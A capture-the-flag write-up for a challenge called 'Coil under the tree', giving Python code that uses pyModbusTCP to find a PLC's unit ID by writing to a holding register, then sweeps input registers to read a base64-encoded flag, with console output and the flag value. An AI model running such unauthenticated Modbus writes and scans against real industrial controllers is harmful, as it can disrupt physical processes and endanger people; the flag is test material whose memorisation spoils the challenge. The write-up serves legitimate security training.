# Day 16 - Coil under the tree

## Challenge
Your are currently connected to internal plant, your objectif will be to extract informations from PLC devices.

The targeted PLC stores important informations in its input registers. But... To get this information you have to:

- Scan and find a valid slave ID;
- Edit its holding register at address 0x10 with the value 0xff;
- Read input registers to get important informations (be quick, you only have 5 seconds to read this data after editing!).

>    - Author : Nishacid
>    - 163.172.68.42:10016

## Scan for a valid unit ID
We first need to find a valid `unit ID`. Here some python code to do the scan. We use python's `pyModbusTCP`.

```python
from pyModbusTCP.client import ModbusClient

def scan():
    for unitid in range(1, 256):
        c = ModbusClient(host="163.172.68.42", port=10016, unit_id=unitid, auto_open=True)
        res = c.write_single_register(0x10, 0xff)
        c.close()
        if res != False:
            print('Found', unitid)
            break
    return unitid
```

The scan returns valid `unit ID 105`.

# Edit holding register and read input registers
We don't know the address of the input registers to read. So let's just loop on the address range, until we found non-empty contents, which happens to be `base64 encoded data`.

```python
def read(unitid):
    for addr in range(0, 65535):
        c = ModbusClient(host="163.172.68.42", port=10016, unit_id=unitid, auto_open=True)
        res = c.write_single_register(0x10, 0xff)
        if res == False:
            print('Write error')
            break
        else:
            res = c.read_input_registers(addr, 125)
            c.close()
            if res != [0]*125:
                info = ''.join([chr(i) for i in res])
                dec = b64decode(info).decode()
                if 'RM{' in dec:
                    return addr, dec
```

Here we go:

```console
$ python3 sol.py
[+] Scan unit_d...
Found 105
[+] Scan unit_id: found 105
[+] Scan input registers...
[+] Scan input registers: ons, you can validate this challenge with: ['RM{13ad1bc2e25b62}\n'] at address 16
```

## Python code
Complete solution in [sol.py](./sol.py)

## Flag
> RM{13ad1bc2e25b62}
